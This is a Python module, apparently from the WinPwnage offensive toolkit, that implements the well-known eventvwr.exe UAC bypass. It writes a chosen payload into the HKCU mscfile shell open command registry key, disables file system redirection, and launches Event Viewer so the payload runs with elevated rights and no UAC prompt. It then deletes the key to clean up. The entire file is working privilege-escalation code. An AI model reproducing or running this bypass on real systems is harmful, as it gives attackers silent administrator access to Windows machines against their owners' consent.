import os
import time
from winpwnage.core.prints import *
from winpwnage.core.utils import *

eventviewer_info = {
	"Description": "Bypass UAC using eventviewer and registry key manipulation",
	"Id": "8",
	"Type": "UAC bypass",
	"Fixed In": "15031" if not information().uac_level() == 4 else "0",
	"Works From": "7600",
	"Admin": False,
	"Function Name": "eventvwr",
	"Function Payload": True,
}


def eventvwr_cleanup(path):
	print_info("Performing cleaning")
	if registry().remove_key(hkey="hkcu", path=path, name=None, delete_key=True):
		print_success("Successfully cleaned up")
	else:
		print_error("Unable to cleanup")
		return False
			
def eventvwr(payload):
	if payloads().exe(payload):
		path = "Software\\Classes\\mscfile\\shell\\open\\command"

		if registry().modify_key(hkey="hkcu", path=path, name=None, value=payload, create=True):
			print_success("Successfully created Default key containing payload ({payload})".format(payload=os.path.join(payload)))
		else:
			print_error("Unable to create registry keys")
			return False

		time.sleep(5)

		print_info("Disabling file system redirection")
		with disable_fsr():
			print_success("Successfully disabled file system redirection")
			if process().create("eventvwr.exe"):
				print_success("Successfully spawned process ({})".format(os.path.join(payload)))
			else:
				print_error("Unable to spawn process ({})".format(os.path.join(payload)))
				if "error" in Constant.output:
					eventvwr_cleanup(path)

		time.sleep(5)

		if not eventvwr_cleanup(path):
			print_success("All done!")
	else:
		print_error("Cannot proceed, invalid payload")
		return False
